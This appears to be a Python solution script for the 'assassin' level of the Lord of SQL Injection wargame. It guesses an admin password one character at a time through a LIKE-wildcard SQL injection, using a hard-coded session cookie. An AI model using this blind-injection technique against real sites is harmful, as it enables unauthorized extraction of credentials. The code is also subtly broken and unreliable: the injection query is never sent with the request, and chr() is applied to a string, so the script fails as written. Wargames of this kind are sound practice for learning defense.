import requests
import string


a = string.printable
a=a[:-38]
password=''
for admin_len in range(8) :
    for admin_pass in a:
        URL='http://los.rubiya.kr/assassin_14a1fd552c61c60f034879e5d4171373.php'
        query={'pw': str(password)+str(admin_pass)+'%'}
        cookies = {'PHPSESSID': '7v7frt2j61ef77qr21dfku1kqb'}
        res=requests.get(URL,cookies=cookies)
        if("Hello admin" in res.text or "Hello guest" in res.text):
            password=password+chr(admin_pass)
            print(password)
            break